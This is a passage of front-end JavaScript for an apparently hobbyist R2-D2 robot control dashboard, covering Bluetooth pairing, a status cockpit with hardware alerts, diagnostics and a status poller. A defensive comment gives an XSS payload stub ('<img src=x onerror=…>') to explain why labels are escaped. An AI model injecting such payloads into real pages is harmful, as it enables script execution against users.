      btn.textContent = 'PAIR';
      btn.dataset.addr = d.address || '';
      btn.dataset.name = d.name || '';
      btn.addEventListener('click', () => this.pair(btn.dataset.addr, btn.dataset.name));
      row.append(nameSpan, addrSpan, btn);
      el2.appendChild(row);
    });
  },

  _renderPaired(list) {
    const el2 = el('bt-paired-list');
    if (!el2) return;
    if (!list.length) {
      el2.innerHTML = '<div style="color:var(--txt-dim);font-size:11px">— No paired controller —</div>';
      return;
    }
    // B-42 mirror — paired list, same DOM-safe construction.
    el2.replaceChildren();
    list.forEach(d => {
      const row = document.createElement('div');
      row.className = 'bt-pair-row';
      const nameSpan = document.createElement('span');
      nameSpan.className = 'bt-pair-name';
      nameSpan.textContent = d.name || '';
      const addrSpan = document.createElement('span');
      addrSpan.className = 'bt-pair-addr';
      addrSpan.textContent = d.address || '';
      const btn = document.createElement('button');
      btn.className = 'btn btn-xs';
      btn.textContent = 'REMOVE';
      btn.dataset.addr = d.address || '';
      btn.addEventListener('click', () => this.unpair(btn.dataset.addr));
      row.append(nameSpan, addrSpan, btn);
      el2.appendChild(row);
    });
  },

  pair(address, name) {
    el('bt-scan-status').textContent = `Pairing with ${name}...`;
    api('/bt/pair', 'POST', { address }).then(() => {
      toast(`Pairing ${name} in progress...`, 'ok');
      setTimeout(() => this.refresh(), 5000);
    });
  },

  unpair(address) {
    // W14 fix 2026-05-16: confirm before forget. Mistap on REMOVE was
    // dropping the operator's only paired controller, forcing a 1-3min
    // re-scan + re-pair cycle. Mirrors the destructive-action pattern
    // used for Audio sound delete (long-press) — explicit confirm here
    // because the cost of an undo is high.
    if (!confirm(`Forget device ${address}?\n\nYou will need to re-pair from scratch (scan + pair). The robot will not auto-connect to this controller anymore.`)) return;
    api('/bt/unpair', 'POST', { address }).then(r => {
      if (r && r.status === 'ok') { toast('Device removed', 'ok'); this.refresh(); }
      else toast('Remove error', 'error');
    });
  },
};

// W10 fix 2026-05-16: live preview text for inactivity timeout slider
function updateBtTimeoutPreview(val) {
  const p = el('bt-timeout-preview');
  if (!p) return;
  const v = parseInt(val, 10) || 0;
  if (v === 0) {
    p.innerHTML = '<span class="bt-preview-warn">⚠ Pause disabled — joystick stays active indefinitely.</span>';
  } else {
    p.innerHTML = `<span class="robot-name">R2-D2</span> will pause if no input for <strong>${v}s</strong>. Press any button to resume.`;
  }
}

// Charger les appareils jumelés au démarrage
// Bug fix 2026-05-16: /bt/scan/devices is now admin-gated (B11 fix).
// Skip the auto-refresh on initial page load — operator will see the
// devices on next Settings → BT panel open (which only happens after
// admin unlock). Was: 401 spam in console on every reload.
window.addEventListener('DOMContentLoaded', () => setTimeout(() => {
  if (typeof adminGuard !== 'undefined' && adminGuard._unlocked) btPairing.refresh();
}, 1500));

let _currentSpeedMode = 'normal';
function setSpeedMode(mode) {
  _currentSpeedMode = mode;
  document.querySelectorAll('.speed-mode-btn').forEach(b => {
    b.classList.toggle('btn-active', b.dataset.mode === mode);
  });
  const limits = { slow: 30, normal: 60, fast: 100 };
  const val = limits[mode] || 60;
  const slider = el('speed-slider');
  if (slider) { slider.value = val; setSpeed(val); }
  toast(`Speed mode: ${mode.toUpperCase()}`, 'ok');
}

// ================================================================
// Cockpit Status Panel
// ================================================================

const cockpitPanel = {
  isOpen: false,

  toggle() {
    this.isOpen = !this.isOpen;
    const panel = el('cockpit-panel');
    const btn   = el('cockpit-btn');
    if (panel) panel.classList.toggle('open', this.isOpen);
    if (btn)   btn.innerHTML = `&#x2B21; STATUS ${this.isOpen ? '&#x25B2;' : '&#x25BC;'}`;
    if (this.isOpen) this._refreshNow();
  },

  close() {
    if (!this.isOpen) return;
    this.isOpen = false;
    const panel = el('cockpit-panel');
    const btn   = el('cockpit-btn');
    if (panel) panel.classList.remove('open');
    if (btn)   btn.innerHTML = '&#x2B21; STATUS &#x25BC;';
  },

  _refreshNow() {
    api('/status').then(data => { if (data) this.update(data); });
  },

  update(data) {
    // B-220 / B-223 (remaining tabs audit 2026-05-15): skip redundant
    // re-renders when the relevant fields haven't changed since last
    // poll. We compute a cheap fingerprint per panel section and only
    // call the _update* helper when its fingerprint moved. Cuts DOM
    // writes from ~30 nodes/2s to near-zero when state is steady.
    const vitalsFP = `${data.cpu_temp}|${data.master_temp}|${data.slave_temp}|${data.cpu_pct}|${data.battery_voltage}|${data.mem?.used_mb}|${data.disk?.used_gb}|${data.slave_uart_health?.cpu_temp}|${data.slave_uart_health?.cpu_pct}|${data.slave_uart_health?.mem?.used_mb}|${data.slave_uart_health?.disk?.used_gb}`;
    if (vitalsFP !== this._lastVitalsFP) {
      this._updateVitals(data);
      this._lastVitalsFP = vitalsFP;
    } else {
      // Always touch vitals once (idempotent layout) — but skip the
      // 30-node innerHTML rewrite. _updateVitals does some
      // CSS-variable updates that are cheap, but the textContent
      // writes inside are the bulk of the cost. Skipping here is
      // safe because nothing visible changed.
    }
    this._updateServices(data);
    this._updateActivity(data);
    this._updateNetwork(data);
    this._updateAlerts(data);
  },

  _updateVitals(data) {
    // W4 fix 2026-05-16: keep gauge thresholds in sync with backend
    // cells+chemistry on every poll (handles cross-tab changes).
    const _cells = data.battery_cells || 4;
    const _chem  = (data.battery_chemistry || 'liion').toLowerCase();
    if (batteryGauge._cells !== _cells || batteryGauge._chem !== _chem) {
      batteryGauge.setCells(_cells, _chem);
    }
    const v = data.battery_voltage;
    if (v != null) {
      const col   = batteryGauge.voltToColor(v);
      const pct   = Math.round(batteryGauge.voltToPct(v));
      const cells = _cells;
      const bv    = el('ck-battery-v');
      const bp    = el('ck-battery-pct');
      if (bv) { bv.textContent = v.toFixed(1) + 'V'; bv.style.color = col; }
      if (bp) { bp.textContent = pct + '%'; bp.style.color = col; }
      const bc = el('ck-battery');
      if (bc) bc.style.borderColor = col + '44';
      const vcellEl = el('ck-battery-vcell');
      if (vcellEl) vcellEl.textContent = (v / cells).toFixed(2) + ' V/cell';
      const lc = data.vesc_l_curr, rc = data.vesc_r_curr;
      const powerEl = el('ck-battery-power');
      if (powerEl) {
        const totalA = (lc != null || rc != null)
          ? (Math.abs(lc ?? 0) + Math.abs(rc ?? 0)) : null;
        const watt = totalA != null ? (totalA * v) : null;
        powerEl.innerHTML = totalA != null
          ? `${totalA.toFixed(1)} A &nbsp;·&nbsp; ${Math.round(watt)} W`
          : '-- A &nbsp;·&nbsp; -- W';
      }
    }
    const lt = data.vesc_l_temp, rt = data.vesc_r_temp;
    const lc = data.vesc_l_curr, rc = data.vesc_r_curr;
    const ld = data.vesc_l_duty, rd = data.vesc_r_duty;
    const ckL = el('ck-vesc-l'), ckR = el('ck-vesc-r');
    if (ckL) {
      ckL.textContent = lt != null ? lt.toFixed(0) + '°C' : '--°C';
      ckL.style.color = lt == null ? '' : lt >= 70 ? 'var(--red)' : lt >= 50 ? 'var(--orange)' : 'var(--green)';
    }
    if (ckR) {
      ckR.textContent = rt != null ? rt.toFixed(0) + '°C' : '--°C';
      ckR.style.color = rt == null ? '' : rt >= 70 ? 'var(--red)' : rt >= 50 ? 'var(--orange)' : 'var(--green)';
    }
    const lcEl = el('ck-vesc-l-curr'), rcEl = el('ck-vesc-r-curr');
    if (lcEl) lcEl.textContent = lc != null ? Math.abs(lc).toFixed(1) + ' A' : '-- A';
    if (rcEl) rcEl.textContent = rc != null ? Math.abs(rc).toFixed(1) + ' A' : '-- A';
    const ldEl = el('ck-vesc-l-duty'), rdEl = el('ck-vesc-r-duty');
    if (ldEl) ldEl.textContent = ld != null ? Math.abs(ld * 100).toFixed(0) + '%' : '--%';
    if (rdEl) rdEl.textContent = rd != null ? Math.abs(rd * 100).toFixed(0) + '%' : '--%';
    const t  = data.temperature;
    const pt = el('ck-pi-temp');
    if (pt) {
      pt.textContent = t != null ? t + '°C' : '--°C';
      pt.style.color = t == null ? '' : t >= 75 ? 'var(--red)' : t >= 60 ? 'var(--orange)' : 'var(--green)';
    }
    const cpuEl = el('ck-pi-cpu');
    if (cpuEl) {
      const c = data.master_cpu;
      cpuEl.textContent = c != null ? `CPU ${c.toFixed(0)}%` : 'CPU --%';
      cpuEl.style.color = c == null ? '' : c >= 90 ? 'var(--red)' : c >= 70 ? 'var(--orange)' : 'rgba(255,255,255,0.35)';
    }
    const mm = data.master_mem;
    const ramEl  = el('ck-pi-ram');
    const diskEl = el('ck-pi-disk');
    if (mm) {
      const usedG  = (mm.used_mb  / 1024).toFixed(1);
      const totalG = (mm.total_mb / 1024).toFixed(1);
      if (ramEl) ramEl.textContent = `RAM ${usedG}/${totalG} GB`;
    }
    const md = data.master_disk;
    if (md && diskEl) diskEl.textContent = `SD ${md.used_gb}/${md.total_gb} GB`;
    const st = data.slave_temp;
    const ps = el('ck-slave-temp');
    if (ps) {
      ps.textContent = st != null ? st + '°C' : '--°C';
      ps.style.color = st == null ? 'rgba(255,255,255,0.3)' : st >= 75 ? 'var(--red)' : st >= 60 ? 'var(--orange)' : 'var(--green)';
    }
    const scpuEl = el('ck-slave-cpu');
    if (scpuEl) {
      const sc = data.slave_cpu;
      scpuEl.textContent = sc != null ? `CPU ${sc.toFixed(0)}%` : 'CPU --%';
      scpuEl.style.color = sc == null ? '' : sc >= 90 ? 'var(--red)' : sc >= 70 ? 'var(--orange)' : 'rgba(255,255,255,0.35)';
    }
    const sm = data.slave_mem;
    const sramEl = el('ck-slave-ram');
    if (sm && sramEl) sramEl.textContent = `RAM ${(sm.used_mb/1024).toFixed(1)}/${(sm.total_mb/1024).toFixed(1)} GB`;
    const sd = data.slave_disk;
    const sdiskEl = el('ck-slave-disk');
    if (sd && sdiskEl) sdiskEl.textContent = `SD ${sd.used_gb}/${sd.total_gb} GB`;
    const up = el('ck-uptime');
    if (up) up.textContent = data.uptime || '--';
    const ver = el('ck-version');
    if (ver) ver.textContent = 'v' + (data.version || '?');
  },

  _svcRow(label, cls, val) {
    // B-40 (audit 2026-05-15): `label` includes user-supplied
    // master_location / slave_location strings (written via
    // /settings/robot_locations, now admin-gated by B-10 but still
    // arbitrary text up to 20 chars). Escape both label AND val so a
    // malicious location like `<img src=x onerror=…>` renders as
    // text. `cls` is from a fixed allowlist (ok/warn/err/dim) and
    // doesn't need escaping. The `val` strings here are all internal
    // constants + numeric ids today but escape them anyway as
    // defence-in-depth — a future code path could feed user data in.
    return `<div class="cockpit-row"><span class="cockpit-row-lbl">${escapeHtml(label)}</span><span class="cockpit-row-val cockpit-${cls}">${escapeHtml(val)}</span></div>`;
  },

  _updateServices(data) {
    const svc = el('ck-services');
    if (!svc) return;
    const uartCls = !data.uart_ready ? 'err' : data.uart_health == null ? 'warn' : 'ok';
    const uartVal = !data.uart_ready ? '✗ DOWN' : data.uart_health == null ? '⚠ NO SLAVE' : '✓ OK';
    const vescLCls = data.vesc_l_ok ? 'ok' : 'err';
    const vescRCls = data.vesc_r_ok ? 'ok' : 'err';
    const btCls    = !data.bt_connected ? 'dim' : (data.bt_rssi != null && data.bt_rssi <= -70) ? 'warn' : 'ok';
    const btVal    = !data.bt_connected ? '— disconnected'
                   : data.bt_rssi != null ? `✓ ${data.bt_rssi} dBm` : '✓ OK';
    const estopCls = data.estop_active ? 'err'  : 'ok';
    const estopVal = data.estop_active ? '⚠ TRIPPED' : '✓ ARMED';
    const benchCls = data.vesc_bench_mode ? 'warn' : 'dim';
    const benchVal = data.vesc_bench_mode ? '⚠ ON' : '— off';
    svc.innerHTML =
      this._svcRow('E-STOP',     estopCls, estopVal) +
      this._svcRow('Bench Mode', benchCls, benchVal) +
      this._svcRow('UART',       uartCls,  uartVal) +
      this._svcRow('VESC L',     vescLCls, data.vesc_l_ok ? '✓ OK' : '✗ OFFLINE') +
      this._svcRow('VESC R',     vescRCls, data.vesc_r_ok ? '✓ OK' : '✗ OFFLINE') +
      this._svcRow(data.lights_backend === 'astropixels' ? 'AstroPixels' : 'Teeces',
                   data.teeces_ready ? 'ok' : 'dim', data.teeces_ready ? '✓ OK' : '— N/A') +
      this._svcRow('Camera',     data.camera_found ? (data.camera_active ? 'ok' : 'dim') : 'warn',
                   data.camera_found ? (data.camera_active ? '✓ streaming' : '✓ found') : '⚠ not found') +
      this._svcRow('BT Gamepad', btCls, btVal) +
      (Array.isArray(data.dome_hat_health) && data.dome_hat_health.length > 0
        ? data.dome_hat_health.map(h =>
            this._svcRow(`${data.master_location} Servo HAT ${h.addr}`, h.ok ? 'ok' : 'warn', h.ok ? '✓ OK' : `⚠ ${h.errors} errors`)
          ).join('')
        : this._svcRow(`${data.master_location} Servo`, data.dome_servo_ready ? 'ok' : 'dim', data.dome_servo_ready ? '✓ OK' : '— N/A')
      ) +
      (Array.isArray(data.body_hat_health) && data.body_hat_health.length > 0
        ? data.body_hat_health.map(h =>
            this._svcRow(`${data.slave_location} Servo HAT ${h.addr}`, h.ok ? 'ok' : 'warn', h.ok ? '✓ OK' : `⚠ ${h.errors} errors`)
          ).join('')
        : this._svcRow(`${data.slave_location} Servo`, data.servo_ready ? 'ok' : 'dim', data.servo_ready ? '✓ OK' : '— N/A')
      ) +
      (data.motor_hat_health
        ? this._svcRow(`${data.slave_location} Motor HAT ${data.motor_hat_health.addr}`, data.motor_hat_health.ok ? 'ok' : 'err',
                       data.motor_hat_health.ok ? '✓ OK' : '✗ not responding')
        : '') +
      (data.display_ready != null
        ? this._svcRow(`${data.slave_location} Screen`,
                       data.display_ready ? 'ok' : 'warn',
                       data.display_ready ? `✓ ${data.display_port || 'OK'}` : '⚠ not connected')
        : this._svcRow(`${data.slave_location} Screen`, 'dim', '— N/A'));
  },

  _updateActivity(data) {
    const act = el('ck-activity');
    if (!act) return;
    const choreoVal = data.choreo_playing
      ? `<span class="cockpit-ok">▶ ${escapeHtml(data.choreo_name || '?')}</span>`
      : '<span class="cockpit-dim">— idle</span>';
    const audioVal = data.audio_playing
      ? `<span class="cockpit-ok">♪ ${escapeHtml(data.audio_current || '?')}</span>`
      : data.choreo_playing
        ? '<span class="cockpit-dim">via Choreo</span>'
        : '<span class="cockpit-dim">— idle</span>';
    const aliveVal = data.alive_enabled
      ? '<span class="cockpit-ok">ON</span>'
      : '<span class="cockpit-dim">OFF</span>';
    act.innerHTML =
      `<div class="cockpit-row"><span class="cockpit-row-lbl">Choreo</span><span class="cockpit-row-val">${choreoVal}</span></div>` +
      `<div class="cockpit-row"><span class="cockpit-row-lbl">Audio</span><span class="cockpit-row-val">${audioVal}</span></div>` +
      `<div class="cockpit-row"><span class="cockpit-row-lbl">ALIVE</span><span class="cockpit-row-val">${aliveVal}</span></div>`;
  },

  _updateNetwork(data) {
    const net = el('ck-network');
    if (!net) return;
    net.innerHTML =
      `<div class="cockpit-row"><span class="cockpit-row-lbl">Master</span><span class="cockpit-row-val cockpit-ok" style="font-size:10px">wlan0: ${escapeHtml(data.master_wlan0 || '—')} &nbsp;|&nbsp; wlan1: ${escapeHtml(data.master_wlan1 || '—')}</span></div>` +
      `<div class="cockpit-row"><span class="cockpit-row-lbl">Slave</span><span class="cockpit-row-val cockpit-ok">${escapeHtml(data.slave_host || '—')}</span></div>` +
      `<div class="cockpit-row"><span class="cockpit-row-lbl">Version</span><span class="cockpit-row-val cockpit-dim">v${escapeHtml(String(data.version || '?'))}</span></div>`;
  },

  updateBtn(data) {
    // Bug fix 2026-05-16: user-reported STATUS pill stayed GREEN on
    // page reload even with bench_mode ON — only turned amber after
    // click. _buildAlerts WAS pushing the bench warn correctly, but
    // some path was skipping the call. Defensive rewrite: compute
    // hasDanger/hasWarn DIRECTLY from data fields here so even if
    // _buildAlerts throws we still color the pill correctly.
    const btn = el('cockpit-btn');
    if (!btn || !data) return;

    // Direct danger checks (any one = red)
    const hasDanger = !!(
      data.estop_active ||
      !data.vesc_l_ok || !data.vesc_r_ok ||
      !data.uart_ready ||
      (data.temperature != null && data.temperature >= 75) ||
      (data.slave_temp  != null && data.slave_temp  >= 75) ||
      (data.vesc_l_temp != null && data.vesc_l_temp >= 70) ||
      (data.vesc_r_temp != null && data.vesc_r_temp >= 70)
    );

    // Direct warn checks (any one = amber, unless danger active)
    const hasWarn = !hasDanger && !!(
      data.vesc_bench_mode ||
      data.lock_mode === 2 ||                          // child lock
      (data.uart_health == null && data.uart_ready) || // slave unreachable
      (data.temperature != null && data.temperature >= 60) ||
      (data.slave_temp  != null && data.slave_temp  >= 60) ||
      (data.vesc_l_temp != null && data.vesc_l_temp >= 50) ||
      (data.vesc_r_temp != null && data.vesc_r_temp >= 50) ||
      data.dome_servo_ready === false ||
      data.servo_ready === false ||
      data.camera_found === false ||
      data.display_ready === false ||
      (typeof data.uart_crc_errors === 'number' && data.uart_crc_errors > 0)
    );

    btn.classList.toggle('danger', hasDanger);
    btn.classList.toggle('alert',  hasWarn);
  },

  _updateAlerts(data) {
    const box = el('ck-alerts');
    if (!box) return;
    const alerts    = this._buildAlerts(data);
    const hasDanger = alerts.some(a => a.cls === 'err');
    const hasWarn   = !hasDanger && alerts.some(a => a.cls === 'warn');
    const panel     = el('cockpit-panel');
    const btn       = el('cockpit-btn');
    if (panel) panel.classList.toggle('has-alert', hasDanger || hasWarn);
    if (btn) {
      btn.classList.toggle('danger', hasDanger);
      btn.classList.toggle('alert',  hasWarn);
    }
    box.innerHTML = alerts.map(a =>
      `<span class="cockpit-alert ${a.cls}">${escapeHtml(a.msg)}</span>`
    ).join('');
  },

  _buildAlerts(data) {
    const alerts = [];
    const t = data.temperature;
    if (t != null) {
      if (t >= 75) alerts.push({ cls: 'err',  msg: `Master Pi ${t}°C — overheating` });
      else if (t >= 60) alerts.push({ cls: 'warn', msg: `Master Pi ${t}°C — watch temp` });
    }
    const st = data.slave_temp;
    if (st != null) {
      if (st >= 75) alerts.push({ cls: 'err',  msg: `Slave Pi ${st}°C — overheating` });
      else if (st >= 60) alerts.push({ cls: 'warn', msg: `Slave Pi ${st}°C — watch temp` });
    }
    const lt = data.vesc_l_temp;
    const rt = data.vesc_r_temp;
    if (lt != null && lt >= 70) alerts.push({ cls: 'err',  msg: `VESC L ${lt.toFixed(0)}°C — overheating` });
    else if (lt != null && lt >= 50) alerts.push({ cls: 'warn', msg: `VESC L ${lt.toFixed(0)}°C — hot` });
    if (rt != null && rt >= 70) alerts.push({ cls: 'err',  msg: `VESC R ${rt.toFixed(0)}°C — overheating` });
    else if (rt != null && rt >= 50) alerts.push({ cls: 'warn', msg: `VESC R ${rt.toFixed(0)}°C — hot` });
    const v = data.battery_voltage;
    if (v != null && batteryGauge.voltToColor(v) === '#ff2244')
      alerts.push({ cls: 'err',  msg: `Battery critical ${v.toFixed(1)}V` });
    else if (v != null && batteryGauge.voltToColor(v) === '#ff8800')
      alerts.push({ cls: 'warn', msg: `Battery low ${v.toFixed(1)}V` });
    if (!data.vesc_l_ok) alerts.push({ cls: 'err', msg: 'VESC L offline / fault' });
    if (!data.vesc_r_ok) alerts.push({ cls: 'err', msg: 'VESC R offline / fault' });
    if (!data.uart_ready)
      alerts.push({ cls: 'err',  msg: 'UART port not open' });
    else if (data.uart_health == null)
      alerts.push({ cls: 'warn', msg: 'Slave unreachable' });
    if (data.dome_servo_ready === false)
      alerts.push({ cls: 'warn', msg: 'Dome servos not ready' });
    if (data.servo_ready === false)
      alerts.push({ cls: 'warn', msg: 'Body servos not ready' });
    if (data.camera_found === false)
      alerts.push({ cls: 'warn', msg: 'Camera not found — check USB' });
    // B-238 (remaining tabs audit 2026-05-15): surface a "Stream
    // offline" alert when the USB camera is detected but mjpg_streamer
    // hasn't actually been streaming for 5+ minutes. Track first-seen
    // time on the cockpit object so the alert only fires after a real
    // sustained outage (not every brief reconnect blip).
    else if (data.camera_found === true && data.camera_active === false) {
      if (!cockpitPanel._streamOfflineSince) {
        cockpitPanel._streamOfflineSince = Date.now();
      } else if (Date.now() - cockpitPanel._streamOfflineSince > 5 * 60 * 1000) {
        alerts.push({ cls: 'warn', msg: 'Camera stream offline — check astromech-camera.service' });
      }
    } else {
      cockpitPanel._streamOfflineSince = null;
    }
    if (Array.isArray(data.dome_hat_health)) {
      data.dome_hat_health.forEach(h => {
        if (!h.ok)
          alerts.push({ cls: 'warn', msg: `${data.master_location} Servo HAT ${h.addr} — ${h.errors} I2C errors` });
      });
    }
    if (Array.isArray(data.body_hat_health)) {
      data.body_hat_health.forEach(h => {
        if (!h.ok)
          alerts.push({ cls: 'warn', msg: `${data.slave_location} Servo HAT ${h.addr} — ${h.errors} I2C errors` });
      });
    }
    if (data.motor_hat_health && !data.motor_hat_health.ok)
      alerts.push({ cls: 'err', msg: `${data.slave_location} Motor HAT ${data.motor_hat_health.addr} — not responding` });
    if (data.display_ready === false)
      alerts.push({ cls: 'warn', msg: `${data.slave_location} Screen (RP2040) not connected` });
    const rssi = data.bt_rssi;
    if (data.bt_connected && rssi != null && rssi <= -80)
      alerts.push({ cls: 'warn', msg: `BT weak signal ${rssi} dBm` });
    if ((data.uart_crc_errors ?? 0) > 0)
      alerts.push({ cls: 'warn', msg: `UART ${data.uart_crc_errors} CRC errors` });
    if (data.estop_active)
      alerts.push({ cls: 'err', msg: '⚠ E-STOP TRIPPED — servos cut' });
    if (data.vesc_bench_mode)
      alerts.push({ cls: 'warn', msg: 'Bench mode ON — VESC safety bypassed' });
    if (alerts.length === 0)
      alerts.push({ cls: 'ok', msg: '✓ No issues detected' });
    return alerts;
  },
};

document.addEventListener('click', (e) => {
  if (!cockpitPanel.isOpen) return;
  const panel = el('cockpit-panel');
  const btn   = el('cockpit-btn');
  if (panel && !panel.contains(e.target) && btn && !btn.contains(e.target))
    cockpitPanel.close();
});

// ================================================================
// DIAGNOSTICS PANEL
// ================================================================
const diagPanel = {
  _filter: 'ALL',
  _autoTimer: null,
  _tailTimer: null,
  // B1/P2 fix 2026-05-16: in-flight guards to prevent duplicate
  // subprocess spawns under rapid clicks + admin tab spam.
  _inFlightLogs: false,
  _inFlightStats: false,
  _inFlightPing: false,
  // E7 fix 2026-05-16: generation token — discards out-of-order
  // log replies after rapid filter switching.
  _loadGen: 0,

  // WOW polish I8 2026-05-15: live log tail mode. Toggle button
  // auto-refreshes logs every 2s + scroll-locks to bottom so
  // operator can watch errors stream in. Auto-stops when panel
  // is hidden.
  toggleTail() {
    const btn = el('diag-tail-btn');
    if (this._tailTimer) {
      clearInterval(this._tailTimer);
      this._tailTimer = null;
      if (btn) {
        btn.textContent = '▶ TAIL';
        btn.classList.remove('btn-active');
      }
      return;
    }
    if (btn) {
      btn.textContent = '◼ TAILING';
      btn.classList.add('btn-active');
    }
    const doTail = async () => {
      // P2 fix 2026-05-16: skip when tab hidden — Android WebView
      // doesn't throttle setInterval, so a backgrounded diag tab with
      // TAIL ON burns Pi CPU 24/7.
      if (document.hidden) return;
      const panel = el('spanel-diagnostics');
      if (!panel || !panel.classList.contains('active')) {
        clearInterval(this._tailTimer);
        this._tailTimer = null;
        if (btn) {
          btn.textContent = '▶ TAIL';
          btn.classList.remove('btn-active');
        }
        return;
      }
      await this.loadLogs();
      const box = el('diag-log-output');
      if (box) box.scrollTop = box.scrollHeight;
    };
    doTail();
    this._tailTimer = setInterval(doTail, 2000);
  },

  load() {
    // P2 fix 2026-05-16: also clear _tailTimer on re-entry so a re-load
    // doesn't leave an orphan TAIL timer racing with the new auto timer.
    if (this._tailTimer) { clearInterval(this._tailTimer); this._tailTimer = null; }
    const btn = el('diag-tail-btn');
    if (btn) { btn.textContent = '▶ TAIL'; btn.classList.remove('btn-active'); }
    this.loadLogs();
    this.loadStats();
    if (this._autoTimer) clearInterval(this._autoTimer);
    this._autoTimer = setInterval(() => {
      if (document.hidden) return;  // P2 fix: skip when tab hidden
      const panel = el('spanel-diagnostics');
      if (!panel || !panel.classList.contains('active')) {
        clearInterval(this._autoTimer);
        this._autoTimer = null;
        return;
      }
      this.loadStats();
    }, 5000);
  },

  setFilter(f) {
    this._filter = f;
    document.querySelectorAll('.diag-filter-btn').forEach(b =>
      b.classList.toggle('active', b.dataset.filter === f)
    );
    this.loadLogs();
  },

  async loadLogs() {
    // B1 fix 2026-05-16: in-flight guard prevents duplicate journalctl
    // subprocess spawns under rapid clicks or auto-tick during slow Pi.
    if (this._inFlightLogs) return;
    this._inFlightLogs = true;
    // E7 fix: generation token for out-of-order rejection on filter spam
    const myGen = ++this._loadGen;
    try {
      const box    = el('diag-log-output');
      const status = el('diag-log-status');
      if (!box) return;
      box.textContent = 'Loading...';
      const data = await api(`/diagnostics/logs?filter=${encodeURIComponent(this._filter)}`);
      // E7: bail if newer load already fired
      if (myGen !== this._loadGen) return;
      if (!data) {
        box.innerHTML = '<span class="cockpit-err">Error — admin re-auth may be needed</span>';
        if (status) status.textContent = '';
        return;
      }
      if (!data.lines || data.lines.length === 0) {
        box.innerHTML = '<span style="color:var(--dim)">— no entries —</span>';
        if (status) status.textContent = '';
        return;
      }
      box.innerHTML = data.lines.map(l => {
        const cls = /error|critical|exception|traceback/i.test(l) ? 'diag-line-err'
                  : /warning/i.test(l)                             ? 'diag-line-warn'
                  : 'diag-line-info';
        return `<div class="${cls}">${escapeHtml(l)}</div>`;
      }).join('');
      box.scrollTop = box.scrollHeight;
      if (status) status.textContent = `${data.lines.length} lines`;
    } finally {
      this._inFlightLogs = false;
    }
  },

  async loadStats() {
    if (this._inFlightStats) return;
    this._inFlightStats = true;
    try {
    const box = el('diag-stats-output');
    if (!box) return;
    // B-115 (audit 2026-05-15): route through api() — /diagnostics/stats
    // is the only diag endpoint not yet admin-protected (info-only),
    // but using api() also handles R2D2_API_BASE for Android WebView.
    const data = await api('/diagnostics/stats');
    if (!data) {
      box.innerHTML = '<span class="cockpit-err">Error fetching stats</span>';
      return;
    }
    const m = data.master || {};
    const s = data.slave  || {};
    const row = (lbl, val) =>
      `<div class="cockpit-row"><span class="cockpit-row-lbl">${lbl}</span><span class="cockpit-row-val">${val}</span></div>`;
    const ok   = v => `<span class="cockpit-ok">${v}</span>`;
    const warn = v => `<span class="cockpit-warn">${v}</span>`;
    const err  = v => `<span class="cockpit-err">${v}</span>`;
    const dim  = v => `<span class="cockpit-dim">${v}</span>`;
    box.innerHTML =
      row('Master UART',   m.uart_ready ? ok('✓ open') : err('✗ closed')) +
      row('CRC errors',    m.crc_errors > 0 ? warn(m.crc_errors) : ok('0')) +
      row('App HB age',    m.hb_age_ms != null ? `${m.hb_age_ms} ms` : dim('—')) +
      row('Slave reach',   s.reachable  ? ok('✓ OK') : warn('⚠ unreachable')) +
      row('UART quality',  s.health_pct != null ? `${s.health_pct}%` : dim('—')) +
      row('UART errors',   s.errors != null ? (s.errors > 0 ? warn(s.errors) : ok(s.errors)) : dim('—')) +
      row('Slave CPU',     s.cpu_pct  != null ? `${s.cpu_pct}%`  : dim('—')) +
      row('Slave temp',    s.cpu_temp != null ? `${s.cpu_temp}°C` : dim('—'));
    } finally {
      this._inFlightStats = false;
    }
  },

  async ping() {
    // E6 fix 2026-05-16: in-flight guard prevents spamming PING.
    if (this._inFlightPing) return;
    this._inFlightPing = true;
    const btn = document.querySelector('button[onclick*="diagPanel.ping"]');
    if (btn) btn.disabled = true;
    try {
      const result = el('diag-ping-result');
      if (result) { result.style.color = 'var(--dim)'; result.textContent = 'Pinging…'; }
      const data = await api('/diagnostics/ping_slave', 'POST');
      if (!result) return;
      if (!data) {
        result.style.color = 'var(--red)';
        result.textContent = '✗ Error (admin re-auth may be needed)';
        return;
      }
      if (data.ok) {
        // W4 fix 2026-05-16: color-tier the OK result instead of all-green
        const ms = data.ms || 0;
        const tier = ms < 50 ? 'var(--ok)' : ms < 200 ? 'var(--warn)' : 'var(--err)';
        result.style.color = tier;
        result.textContent = `✓ ${ms} ms`;
      } else {
        result.style.color = 'var(--red)';
        result.textContent = `✗ ${data.error || 'timeout'} (${data.ms} ms)`;
      }
    } finally {
      this._inFlightPing = false;
      if (btn) btn.disabled = false;
    }
  },
};

document.addEventListener('keydown', (e) => {
  if (e.key === 'Escape' && cockpitPanel.isOpen) cockpitPanel.close();
});

// ================================================================
// Status Poller
// ================================================================

class StatusPoller {
  constructor() {
    this._interval = null;
    // In-flight guard: when the Pi is slow (e.g. mid-deploy or settings save)
    // setInterval would otherwise stack up /status requests until they all
    // time out. Skipping ticks while one is in flight keeps Flask thread
    // pressure bounded and the UI responsive.
    this._inFlight = false;
  }

  start(intervalMs = 2000) {
    this.poll();
    this._interval = setInterval(() => this.poll(), intervalMs);
  }

  async poll() {
    if (this._inFlight) return;
    // Perf 2026-05-15: skip polling when tab is backgrounded. Saves
    // ~21,000 wasteful POSTs over a 12h event (tablet pocket-locked
    // hourly) + skips the full _pollOnce DOM update path. Safety
    // covered by heartbeat worker which keeps running (and also
    // surfaces estop_active via M2 fix).
    if (typeof document !== 'undefined' && document.hidden) return;
    this._inFlight = true;
    try {
      await this._pollOnce();
    } finally {
      this._inFlight = false;
    }
  }

  async _pollOnce() {
    const data = await api('/status');
    if (!data) {
      this._setOffline(true);
      return;
    }
    this._setOffline(false);
    // W1+W2 fix 2026-05-16: cache /status snapshot for HAT panel
    // meta rendering (HAT health dots + servo count preview).
    _lastStatusForHats = data;
    // Re-render HAT meta if HATs panel is visible.
    const hatsPanel = el('spanel-hats');
    if (hatsPanel && hatsPanel.classList.contains('active')) {
      try {
        validateHatField('master-hats-input');
        validateHatField('slave-hats-input');
        validateHatField('slave-motor-hat-input', true);
      } catch {}
    }
    // W1 fix 2026-05-16: refresh battery preview NOW voltage every
    // poll if Battery panel visible (uses cached _lastStatusForHats).
    const battPanel = el('spanel-battery');
    if (battPanel && battPanel.classList.contains('active')) {
      try { updateBatteryPreview(); } catch {}
    }
    // W1 fix 2026-05-16: refresh camera status pill if Camera panel visible
    const camPanel = el('spanel-camera');
    if (camPanel && camPanel.classList.contains('active')) {
      try { updateCameraStatusPill(data); } catch {}
    }
    // W2 fix 2026-05-16: default-admin-password warning banner
